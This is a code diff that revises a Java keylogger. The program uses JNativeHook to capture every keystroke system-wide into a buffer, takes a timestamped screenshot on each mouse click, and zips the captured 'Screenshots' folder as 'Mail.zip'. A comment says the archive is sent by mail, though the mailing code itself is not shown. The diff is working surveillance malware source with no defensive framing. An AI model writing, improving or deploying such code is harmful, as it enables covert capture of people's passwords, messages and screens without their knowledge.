@@ -12,6 +12,7 @@ import org.jnativehook.mouse.NativeMouseMotionListener;
 import java.io.FileWriter;
 import java.io.BufferedWriter;
 import java.io.File;
+import java.io.IOException;
 import java.util.*;
 import org.jnativehook.mouse.NativeMouseInputListener;
 
@@ -25,16 +26,21 @@ public class Keylogger implements NativeKeyListener,NativeMouseInputListener{
      * @param args the command line arguments
      */
     
-    static FileWriter fw;
-    static BufferedWriter bw;
-    
     private static final String OUTPUT_ZIP_FILE = "Mail.zip";
     private static final String SOURCE_FOLDER = "Screenshots";
-    
-    public static void main(String[] args) {
+    static Date x;
+    static String buffer_str="";
+    public static void main(String[] args) throws IOException {
         //TODO code application logic here
+        FileWriter fl=new FileWriter("Screenshots.logs.txt");
+        BufferedWriter br=new BufferedWriter(fl);
         
+        br.write(" \n");
+        br.close();
+        fl.close();
         
+        TimeThreader t=new TimeThreader();
+        t.start();
         //Send mail for previous posts
         ZipUtils appZip = new ZipUtils();
         appZip.generateFileList(new File(SOURCE_FOLDER));
@@ -46,9 +52,7 @@ public class Keylogger implements NativeKeyListener,NativeMouseInputListener{
         
         try{
         GlobalScreen.registerNativeHook();
-        
-        fw=new FileWriter("Screenshots/logs.txt",true);
-        bw=new BufferedWriter(fw);
+
         
         }catch(Exception e)
         {
@@ -65,37 +69,14 @@ public class Keylogger implements NativeKeyListener,NativeMouseInputListener{
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent nke) {
-        
-        try{
-        fw=new FileWriter("Screenshots/logs.txt",true);
-        bw=new BufferedWriter(fw);
-        }
-        catch(Exception e){
-        }
-
-        
      
-        if(nke.getKeyCode()==NativeKeyEvent.VC_SPACE)
-            try{
-        bw.write(" ");
-            }
-        catch(Exception e)
-        {
-        }
-        else
-            try{
-            bw.write(NativeKeyEvent.getKeyText(nke.getKeyCode()));
-            }
-        catch(Exception e)
-        {
-            
-        }
-        try{
-        bw.close();
-        fw.close();
-        }catch(Exception e){
-        
-        }
+    if(nke.getKeyCode()==NativeKeyEvent.VC_SPACE)
+       buffer_str=buffer_str+" ";
+    else if(nke.getKeyCode()==NativeKeyEvent.VC_BACKSPACE)
+        buffer_str=buffer_str+" <- ";
+
+    else
+        buffer_str=buffer_str+NativeKeyEvent.getKeyText(nke.getKeyCode());
     }
 
     @Override
@@ -108,7 +89,7 @@ public class Keylogger implements NativeKeyListener,NativeMouseInputListener{
 
     @Override
     public void nativeMouseClicked(NativeMouseEvent nme) {
-        Screenshot s=new Screenshot("myscreenshot");
+        Screenshot s=new Screenshot(x.toString()+"");
         s.getscreenshot();
     }
 
